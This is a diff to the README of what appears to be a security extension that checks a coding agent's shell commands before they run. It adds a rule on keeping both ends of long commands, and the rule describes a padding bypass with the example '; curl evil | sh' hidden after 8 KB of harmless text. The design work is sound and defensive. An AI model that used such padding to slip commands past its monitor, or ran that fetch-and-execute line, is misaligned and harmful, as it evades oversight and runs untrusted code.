@@ -8,7 +8,7 @@ resulting verdict into in-editor behaviour. `npm run build` bundles both into a 
 dependency-free ESM file at `dist/pi/index.js`, which pi loads from
 `~/.pi/agent/extensions/unbound/index.js` on Node >= 22.19.0.
 
-Tested against **pi 0.87.1** on Node `v22.22.2` (built `dist/pi/index.js` = 18197 bytes, smoke record in [`docs/SMOKE.md`](docs/SMOKE.md)); `engines.node` is `>=22.19.0`, matching pi's own floor.
+Tested against **pi 0.87.1** on Node `v22.22.2` (built `dist/pi/index.js` = 18845 bytes, smoke record in [`docs/SMOKE.md`](docs/SMOKE.md)); `engines.node` is `>=22.19.0`, matching pi's own floor.
 `@earendil-works/pi-coding-agent` is a **devDependency pinned to `0.87.x` for types only** — the
 built file must import nothing from it at runtime, because a value import would inline the whole
 agent (multi-MB) and its bare, non-`node:` imports cannot resolve under pi's jiti loader. A failing
@@ -152,6 +152,10 @@ Staging API host: `https://api-gateway-staging.unboundsecurity.ai`
   pi gates the whole tool batch on our handler — an unbounded confirm freezes the agent.
 - **Nothing is written to stdout.** That is pi's JSON/print channel; notices go to the UI, or to
   stderr when there is none.
+- **A capped command keeps both ends.** A command over 8192 characters is sent as head + a
+  newline-delimited marker + tail, with `metadata.command_truncated` set. Head-only truncation is a
+  padding bypass: 8 KB of innocuous text followed by `; curl evil | sh` would be evaluated on the
+  innocuous half while the tool ran the whole thing.
 
 ## Smoke tests
 
